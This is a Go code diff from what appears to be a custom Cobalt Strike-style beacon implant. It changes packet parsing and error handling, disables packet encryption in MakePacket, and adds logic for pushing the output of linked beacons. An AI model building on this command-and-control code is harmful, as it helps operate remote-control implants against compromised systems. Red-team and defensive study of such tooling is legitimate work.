@@ -102,7 +102,8 @@ func DecryptPacket(b []byte) ([]byte, bool) {
 		aesDecrypted, err := crypt.AesCBCDecrypt(restBytes, config.AesKey)
 
 		if err != nil {
-			panic(err)
+			processErrorTest(0, 0, 0, err.Error())
+			// panic(err)
 		}
 
 		return aesDecrypted, hmacVerfied
@@ -135,21 +136,24 @@ func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
 	commandTypeBytes := make([]byte, 4)
 	_, err := buf.Read(commandTypeBytes)
 	if err != nil {
-		panic(err)
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
 	}
 	commandType := binary.BigEndian.Uint32(commandTypeBytes)
 	fmt.Printf("Reading Command Len Bytes...\n")
 	commandLenBytes := make([]byte, 4)
 	_, err = buf.Read(commandLenBytes)
 	if err != nil {
-		panic(err)
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
 	}
 	fmt.Printf("Reading Command Bytes...\n")
 	commandLen := ReadInt(commandLenBytes)
 	commandBuf := make([]byte, commandLen)
 	_, err = buf.Read(commandBuf)
 	if err != nil {
-		panic(err)
+		processErrorTest(0, 0, 0, err.Error())
+		// panic(err)
 	}
 	*totalLen = *totalLen - (4 + 4 + commandLen)
 	return commandType, commandBuf
@@ -193,7 +197,8 @@ func MakePacket(replyType int, b []byte) []byte {
 	hmacHashBytes := crypt.HmacHash(encrypted)
 	buf.Write(hmacHashBytes)
 
-	return EncryptPacket(buf.Bytes())
+	// return EncryptPacket(buf.Bytes())
+	return buf.Bytes()
 
 }
 
@@ -350,6 +355,9 @@ func PushResult(b []byte) *req.Resp {
 	return resp
 }
 
+// old idea, that was stupid in hindsight: create a new push request for each beacon that we link to
+// new idea, is CS implements it: create one request for push, combine all output slices
+// as all output slices are prepended by their length, we can just concat them to one big slice, and CS will handle the output accordingly
 func PushChainResult(chainClientId int, b []byte) *req.Resp {
 	// url := config.PostUrl + strconv.Itoa(clientID)
 	maskedClientID := mask([]byte(strconv.Itoa(chainClientId)))
